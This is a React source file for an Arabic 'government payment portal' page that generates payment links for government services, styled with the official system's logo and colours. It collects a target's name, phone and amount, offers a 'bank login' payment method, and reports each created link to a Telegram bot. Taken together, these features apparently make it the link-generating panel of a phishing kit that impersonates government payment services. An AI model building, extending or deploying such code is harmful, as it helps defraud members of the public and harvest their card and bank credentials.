import React, { useState, useMemo, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getGovernmentServiceByKey } from "@/lib/governmentPaymentServices";
import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { 
  Landmark, 
  FileText, 
  DollarSign, 
  User, 
  Phone, 
  Mail,
  Copy,
  ExternalLink,
  CheckCircle,
  Shield,
  Lock,
  ArrowRight,
  Info,
  RefreshCw,
  Hash,
  ShieldCheck,
  Building2,
  CreditCard
} from "lucide-react";
import BackButton from "@/components/BackButton";
import { sendToTelegram } from "@/lib/telegram";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import BottomNav from "@/components/BottomNav";

const GovernmentPaymentLinkCreator = () => {
  const { country, serviceKey } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  
  const govService = useMemo(() => getGovernmentServiceByKey(serviceKey || ''), [serviceKey]);
  const govSystem = useMemo(() => getGovernmentPaymentSystem(country || 'SA'), [country]);
  
  const [fullName, setFullName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [email, setEmail] = useState("");
  const [amount, setAmount] = useState("");
  const [reference, setReference] = useState("");
  const [description, setDescription] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [createdLink, setCreatedLink] = useState("");
  const [linkId, setLinkId] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [copied, setCopied] = useState(false);

  const primaryColor = govSystem?.colors?.primary || "#F58220";

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  if (!govService) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-gray-50">
        <Card className="p-8 text-center max-w-md shadow-lg border-0">
          <h2 className="text-xl font-bold mb-4 text-red-600">الخدمة غير موجودة</h2>
          <Button onClick={() => navigate('/services')} className="w-full h-12 text-base font-bold">العودة للخدمات</Button>
        </Card>
      </div>
    );
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    if (!fullName || !phoneNumber || !amount) {
      toast({ title: "خطأ", description: "يرجى تعبئة الحقول المطلوبة", variant: "destructive" });
      setIsSubmitting(false);
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "government",
        country_code: country || govService.country,
        payload: {
          service_key: serviceKey,
          service_name: govService.nameAr,
          customerInfo: { fullName, phoneNumber, email },
          cod_amount: parseFloat(amount),
          currency_code: getCurrencyCode(country || govService.country),
          reference,
          description,
          selectedCountry: country || govService.country,
          payment_method: paymentMethod,
          govId: country || 'SA'
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: serviceKey || 'government',
        country: country || 'SA',
        amount: parseFloat(amount),
        currency: getCurrencyCode(country || 'SA'),
        paymentMethod: paymentMethod,
        type: 'government'
      });
      setCreatedLink(paymentUrl);
      setLinkId(link.id);
      setShowSuccess(true);

      await sendToTelegram({
        type: 'payment_recipient',
        data: {
          service: govService.nameAr,
          customer_name: fullName,
          phone: phoneNumber,
          amount: parseFloat(amount),
          currency: getCurrencySymbol(country || govService.country),
          payment_url: paymentUrl,
        },
        timestamp: new Date().toISOString(),
      });

      toast({ title: "تم بنجاح" });
    } catch (error) {
      toast({ title: "خطأ", description: "فشل إنشاء الرابط", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdLink);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({ title: "تم النسخ" });
  };


  return (
    <div className="min-h-screen bg-slate-50" dir="rtl">
      <header className="bg-white border-b h-16 flex items-center px-4 sticky top-0 z-50 shadow-sm">
        <div className="container mx-auto flex justify-between items-center">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 rounded-lg flex items-center justify-center text-white" style={{ background: primaryColor }}>
              <Landmark className="w-5 h-5" />
            </div>
            <h1 className="font-black text-gray-800">بوابة السداد الحكومي</h1>
          </div>
          <BackButton />
        </div>
      </header>

      <main className="container mx-auto px-4 py-6 max-w-xl">
        <form onSubmit={handleSubmit} className="space-y-4">
           <Card className="p-6 border-2 rounded-3xl shadow-xl space-y-6">
              <div className="p-4 rounded-2xl flex items-center gap-4 animate-in fade-in slide-in-from-top-2" style={{ background: `${primaryColor}10`, border: `1px solid ${primaryColor}20` }}>
                <div className="w-20 h-10 bg-white rounded-lg p-1 flex items-center justify-center border shadow-sm">
                   <img src={govService.logo || govSystem?.logo} alt="" className="max-h-full max-w-full object-contain" />
                </div>
                <div>
                  <h4 className="font-black text-sm" style={{ color: primaryColor }}>{govService.nameAr}</h4>
                  <p className="text-[10px] font-bold opacity-70">{govSystem?.description}</p>
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="space-y-1.5">
                  <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">اسم المستفيد</Label>
                  <div className="relative">
                    <Input value={fullName} onChange={(e) => setFullName(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" placeholder="الاسم الكامل" />
                    <User className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
                  </div>
                </div>
                <div className="space-y-1.5">
                  <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">رقم الجوال</Label>
                  <div className="relative">
                    <Input value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10 text-left" dir="ltr" placeholder="05XXXXXXXX" />
                    <Phone className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="space-y-1.5">
                   <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">المبلغ المطلوب</Label>
                   <div className="relative">
                     <Input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" />
                     <div className="absolute right-3 top-1/2 -translate-y-1/2 font-bold text-gray-300 text-[10px]">{getCurrencySymbol(country || govService.country)}</div>
                   </div>
                </div>
                <div className="space-y-1.5">
                  <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">رقم المرجع</Label>
                  <div className="relative">
                    <Input value={reference} onChange={(e) => setReference(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" placeholder="INV-XXXX" />
                    <Hash className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
                  </div>
                </div>
              </div>

              <div className="space-y-1.5">
                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">وصف الرسوم</Label>
                <div className="relative">
                  <Input value={description} onChange={(e) => setDescription(e.target.value)} placeholder="مثال: رسوم تجديد، غرامة..." className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" />
                  <FileText className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
                </div>
              </div>

              {parseFloat(amount) > 0 && (
                <div className="p-4 rounded-2xl bg-slate-900 text-white animate-in zoom-in-95 duration-300 shadow-xl">
                  <div className="flex justify-between items-center mb-2">
                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">المبلغ الإجمالي</span>
                    <Shield className="w-4 h-4 text-green-400" />
                  </div>
                  <div className="flex items-baseline gap-2">
                    <span className="text-3xl font-black">{amount}</span>
                    <span className="text-xs font-bold text-slate-400">{getCurrencySymbol(country || govService.country)}</span>
                  </div>
                </div>
              )}

              <div className="space-y-3 pt-4 border-t">
                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">طريقة الدفع المتاحة</Label>
                <div className="grid grid-cols-2 gap-3">
                   <button type="button" onClick={() => setPaymentMethod('card')} className={`p-4 rounded-2xl border-2 transition-all flex flex-col items-center gap-2 ${paymentMethod === 'card' ? 'border-primary bg-primary/5' : 'border-slate-100 bg-slate-50'}`}>
                      <CreditCard className={`w-6 h-6 ${paymentMethod === 'card' ? 'text-primary' : 'text-slate-300'}`} />
                      <span className={`text-[10px] font-black uppercase ${paymentMethod === 'card' ? 'text-primary' : 'text-slate-400'}`}>بطاقة دفع</span>
                   </button>
                   <button type="button" onClick={() => setPaymentMethod('bank_login')} className={`p-4 rounded-2xl border-2 transition-all flex flex-col items-center gap-2 ${paymentMethod === 'bank_login' ? 'border-primary bg-primary/5' : 'border-slate-100 bg-slate-50'}`}>
                      <Building2 className={`w-6 h-6 ${paymentMethod === 'bank_login' ? 'text-primary' : 'text-slate-300'}`} />
                      <span className={`text-[10px] font-black uppercase ${paymentMethod === 'bank_login' ? 'text-primary' : 'text-slate-400'}`}>دخول بنكي</span>
                   </button>
                </div>
              </div>
           </Card>

           <Button type="submit" disabled={isSubmitting} className="w-full h-16 rounded-3xl font-black text-lg shadow-xl text-white transition-all active:scale-95" style={{ background: govSystem?.gradients?.primary || primaryColor }}>
             {isSubmitting ? <RefreshCw className="w-6 h-6 animate-spin" /> : <><ShieldCheck className="w-5 h-5 ml-2" /> إصدار رابط سداد حكومي</>}
           </Button>
        </form>
      </main>

      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
        <AlertDialogContent className="max-w-[90%] rounded-3xl border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
           <div className="p-8 text-center space-y-6">
              <div className="w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-2" style={{ background: `${primaryColor}15` }}>
                <div className="w-12 h-12 rounded-full flex items-center justify-center animate-bounce" style={{ background: primaryColor }}>
                  <RefreshCw className="w-6 h-6 text-white" />
                </div>
              </div>
              <div>
                <AlertDialogTitle className="text-2xl font-black text-gray-900">رابط السداد جاهز!</AlertDialogTitle>
                <AlertDialogDescription className="font-bold text-gray-500 text-sm">تم توليد رابط دفع آمن لهذه الخدمة الحكومية</AlertDialogDescription>
              </div>

              <div className="bg-gray-50 p-4 rounded-2xl border-2 border-dashed border-gray-200 break-all font-mono text-xs font-bold text-gray-400">
                {createdLink}
              </div>

              <div className="flex gap-3">
                 <Button onClick={handleCopyLink} className="flex-1 h-14 rounded-2xl font-black bg-gray-900 text-white gap-2">
                   {copied ? <CheckCircle className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                   {copied ? "تم النسخ" : "نسخ الرابط"}
                 </Button>
                 <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="flex-1 h-14 rounded-2xl font-black border-2 gap-2 text-gray-700">
                   <ExternalLink className="w-4 h-4" /> معاينة
                 </Button>
              </div>
              <Button variant="ghost" onClick={() => setShowSuccess(false)} className="w-full font-bold text-gray-400">إغلاق</Button>
           </div>
        </AlertDialogContent>
      </AlertDialog>
      <div className="h-20" />
      <BottomNav />
    </div>
  );
};

export default GovernmentPaymentLinkCreator;
